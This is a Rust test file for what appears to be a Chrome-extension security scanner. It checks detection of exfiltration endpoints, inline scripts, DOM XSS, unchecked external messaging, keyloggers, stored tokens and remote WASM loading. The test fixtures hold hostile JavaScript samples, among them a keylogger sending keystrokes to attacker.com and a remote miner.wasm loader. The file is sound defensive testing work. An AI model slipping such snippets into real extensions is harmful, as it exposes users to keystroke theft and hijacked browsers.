use crx_gate::ast::patterns::{
    check_html_csp_violations, check_suspicious_endpoint, shannon_entropy,
};

#[test]
fn test_shannon_entropy_calculation() {
    // 1. Identical chars -> 0 entropy
    assert_eq!(shannon_entropy("aaaaaaaaaa"), 0.0);

    // 2. Normal English prose -> around 3.5 - 4.2
    let english = "The quick brown fox jumps over the lazy dog repeatedly";
    let english_ent = shannon_entropy(english);
    assert!(english_ent > 3.0 && english_ent < 4.5);

    // 3. High entropy base64 random payload -> > 5.2
    let high_entropy = "k9X2mQ8vL4zP7wR1tY5nB0cE3fG6hJ+9/aAbCdEfGhIjKlMnOpQrStUvWxYz0123456789=";
    let high_ent = shannon_entropy(high_entropy);
    assert!(high_ent >= 5.0, "Encrypted/packed string should have high entropy (got {})", high_ent);
}

#[test]
fn test_c2_endpoint_detection() {
    // Discord webhook
    let discord = check_suspicious_endpoint("https://discord.com/api/webhooks/1234567890/token_abc_xyz");
    assert!(discord.is_some());
    assert_eq!(discord.unwrap().category, "Discord Webhook Exfiltration");

    // Telegram Bot
    let telegram = check_suspicious_endpoint("https://api.telegram.org/bot12345678:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage");
    assert!(telegram.is_some());
    assert_eq!(telegram.unwrap().category, "Telegram Bot C2 API");

    // Ngrok
    let ngrok = check_suspicious_endpoint("https://c2-tunnel.ngrok-free.app/payload");
    assert!(ngrok.is_some());
    assert_eq!(ngrok.unwrap().category, "Ngrok Tunneling / Ephemeral C2");

    // Raw Public IP
    let raw_ip = check_suspicious_endpoint("http://198.51.100.23:8080/sink");
    assert!(raw_ip.is_some());
    assert_eq!(raw_ip.unwrap().category, "Raw Public IP Network Sink");

    // Safe URLs should NOT be flagged
    assert!(check_suspicious_endpoint("https://github.com/crx-gate").is_none());
    assert!(check_suspicious_endpoint("https://www.google.com/search").is_none());
    assert!(check_suspicious_endpoint("http://localhost:8080/api").is_none());
    assert!(check_suspicious_endpoint("http://127.0.0.1:3000/status").is_none());
}

#[test]
fn test_html_csp_violations_detection() {
    let html = r#"
        <!DOCTYPE html>
        <html>
        <head>
            <!-- Permissible external script -->
            <script src="bundle.js"></script>
        </head>
        <body>
            <!-- Prohibited inline event handler -->
            <button onclick="handleClick()">Submit</button>
            <div onmouseover="trackHover()">Hover</div>

            <!-- Prohibited inline script -->
            <script>
                console.log("Inline code executed");
            </script>
        </body>
        </html>
    "#;

    let violations = check_html_csp_violations("popup.html", html);
    assert_eq!(violations.len(), 3, "Expected 1 inline script and 2 inline event handlers");

    let has_script = violations.iter().any(|v| v.kind == "Inline <script>");
    assert!(has_script);

    let event_handlers: Vec<_> = violations.iter().filter(|v| v.kind == "Inline Event Handler").collect();
    assert_eq!(event_handlers.len(), 2);
}

#[test]
fn test_dom_xss_detection() {
    let js = r#"
        const payload = location.hash.substring(1);
        document.getElementById('output').innerHTML = payload;
        document.write("<b>Dangerous</b>");
    "#;
    let report = crx_gate::ast::analyze_js_content("popup.js", js);
    assert_eq!(report.dom_xss_findings.len(), 2);
    assert!(report.dom_xss_findings.iter().any(|f| f.kind.contains("innerHTML")));
    assert!(report.dom_xss_findings.iter().any(|f| f.kind.contains("document.write")));
}

#[test]
fn test_insecure_external_message_detection() {
    // 1. Insecure listener without sender check
    let insecure_js = r#"
        chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
            console.log("Received command:", request.action);
            sendResponse({ status: "done" });
        });
    "#;
    let report1 = crx_gate::ast::analyze_js_content("background.js", insecure_js);
    assert_eq!(report1.insecure_external_msg_findings.len(), 1);

    // 2. Safe listener that checks sender.origin
    let safe_js = r#"
        chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
            if (sender.origin !== "https://trusted-portal.company.com") {
                return;
            }
            sendResponse({ ok: true });
        });
    "#;
    let report2 = crx_gate::ast::analyze_js_content("background.js", safe_js);
    assert_eq!(report2.insecure_external_msg_findings.len(), 0, "Safe listener checking origin should not be flagged");
}

#[test]
fn test_keylogger_and_password_snooping_detection() {
    let js = r#"
        window.addEventListener("keydown", (e) => {
            fetch("https://attacker.com/keys?k=" + e.key);
        });
        const pwField = document.querySelector("input[type='password']");
    "#;
    let report = crx_gate::ast::analyze_js_content("content.js", js);
    assert_eq!(report.keylogger_findings.len(), 2);
    assert!(report.keylogger_findings.iter().any(|f| f.trigger.contains("keydown")));
    assert!(report.keylogger_findings.iter().any(|f| f.trigger.contains("Password")));
}

#[test]
fn test_storage_sync_credentials_detection() {
    let js = r#"
        chrome.storage.sync.set({
            auth_token: "secret_12345",
            user_theme: "dark"
        });
    "#;
    let report = crx_gate::ast::analyze_js_content("background.js", js);
    assert_eq!(report.storage_sync_findings.len(), 1);
    assert_eq!(report.storage_sync_findings[0].key_name, "auth_token");
}

#[test]
fn test_remote_wasm_detection() {
    let js = r#"
        WebAssembly.instantiateStreaming(fetch("https://cdn.malicious-modules.com/miner.wasm"));
    "#;
    let report = crx_gate::ast::analyze_js_content("worker.js", js);
    assert_eq!(report.remote_wasm_findings.len(), 1);
    assert!(report.remote_wasm_findings[0].api_name.contains("instantiateStreaming"));
}
